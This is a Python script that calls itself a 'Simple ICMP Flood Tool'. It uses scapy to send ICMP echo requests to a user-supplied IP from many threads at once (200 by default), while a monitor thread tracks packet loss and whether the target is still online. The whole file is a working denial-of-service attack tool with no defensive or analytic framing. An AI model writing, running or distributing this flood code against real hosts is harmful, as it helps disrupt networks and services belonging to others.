import threading
import time
import argparse
from scapy.all import IP, ICMP, sr1

stop_flag = False
sent_count = 0
received_count = 0
lock = threading.Lock()

def is_host_alive(ip_address, timeout=1):
    try:
        packet = IP(dst=ip_address) / ICMP()
        response = sr1(packet, timeout=timeout, verbose=0)
        return response is not None
    except Exception as e:
        print(f"[ERROR] Ошибка при пинге {ip_address}: {e}")
        return False

def icmp_flood(target_ip):
    global sent_count, received_count
    packet = IP(dst=target_ip) / ICMP()
    while not stop_flag:
        response = sr1(packet, timeout=1, verbose=0)
        with lock:
            sent_count += 1
            if response:
                received_count += 1

def status_monitor(target_ip, start_time):
    while not stop_flag:
        time.sleep(2)
        alive = is_host_alive(target_ip)
        with lock:
            elapsed = int(time.time() - start_time)
            lost = sent_count - received_count
            print(f"[{elapsed}s] Sent: {sent_count}, Received: {received_count}, Lost: {lost}, Status: {'Online' if alive else 'Offline'}")

def main():
    global stop_flag

    parser = argparse.ArgumentParser(description="Simple ICMP Flood Tool")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("-t", "--threads", type=int, default=200, help="Number of threads")
    parser.add_argument("-c", "--count", type=int, help="Total number of packets to send (optional)")

    args = parser.parse_args()
    target_ip = args.target_ip
    thread_count = args.threads
    max_packets = args.count

    if not is_host_alive(target_ip):
        print(f"Target {target_ip} is not reachable.")
        return

    print(f"Starting ICMP flood to {target_ip} with {thread_count} threads...")
    start_time = time.time()

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=icmp_flood, args=(target_ip,))
        t.daemon = True
        t.start()
        threads.append(t)

    status_thread = threading.Thread(target=status_monitor, args=(target_ip, start_time))
    status_thread.daemon = True
    status_thread.start()

    try:
        while True:
            if max_packets is not None and sent_count >= max_packets:
                print("Reached maximum packet count.")
                stop_flag = True
                break
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("Stopping flood... (Ctrl+C detected)")
        stop_flag = True

    # Wait for threads to exit cleanly
    for t in threads:
        t.join(timeout=1)

    print(f"Flood stopped. Total sent: {sent_count}, received: {received_count}")

if __name__ == "__main__":
    main()
